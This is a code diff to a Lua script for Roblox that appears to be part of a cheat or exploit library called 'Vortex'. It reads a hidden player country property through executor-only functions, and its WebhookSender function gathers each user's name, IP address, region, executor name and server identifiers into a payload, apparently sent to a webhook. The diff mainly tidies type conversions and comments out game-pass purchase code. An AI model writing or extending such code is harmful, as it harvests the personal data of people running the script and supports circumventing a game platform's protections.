@@ -82,7 +82,7 @@ end
 
 local function Virtual_Region()
   local Thing = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
-  local ParsedCountry = Thing[gethiddenproperty(game.Players.LocalPlayer,"CountryRegionCodeReplicate")]
+  local ParsedCountry = Thing[gethiddenproperty(LocalPlayer,"CountryRegionCodeReplicate")]
     return ParsedCountry
 end
 
@@ -104,7 +104,7 @@ end
 local function PI(str)
 	return MarketplaceService:GetProductInfo(str)
 end
-
+--[[
 function Vortex:PromptPurchase(id)
 	MarketplaceService:PromptGamePassPurchase(LocalPlayer,id)
 end
@@ -130,6 +130,7 @@ local function onPromptPurchaseFinished(player,purchasedPassID,purchaseSuccess)
 end
 
 --MarketplaceService.PromptGamePassPurchaseFinished:Connect(onPromptPurchaseFinished)
+]]
 
 function Vortex:ProtectUsername()
 LocalPlayer:GetPropertyChangedSignal("Name"):Connect(function()
@@ -178,14 +179,14 @@ function Vortex:WebhookSender(prompt)
         ["content"] = prompt,
 	["From"] = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")",
 	["Exploit"] = Exploit(),
-	["User-Region"] = tostring(Virtual_Region()),
-	["User-IP"] = tostring(Virtual_IP()),
-	["Time"] = tostring(os.date("%X")) .. " ( " .. tostring(Virtual_Region()) .. " )",
-	["Date"] = tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. tostring(Virtual_Region()),
+	["User-Region"] = Virtual_Region(),
+	["User-IP"] = Virtual_IP(),
+	["Time"] = tostring(os.date("%X")) .. " ( " .. Virtual_Region() .. " )",
+	["Date"] = tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. Virtual_Region(),
 	["GAME"] = {
-		["Game-Name"] = tostring(PI(game.PlaceId).Name),
-		["Game-ID"] = tostring(game.PlaceId),
-		["Server-JobId"] = tostring(game.JobId)
+		["Game-Name"] = PI(game.PlaceId).Name,
+		["Game-ID"] = game.PlaceId,
+		["Server-JobId"] = game.JobId
 	}
     }
 
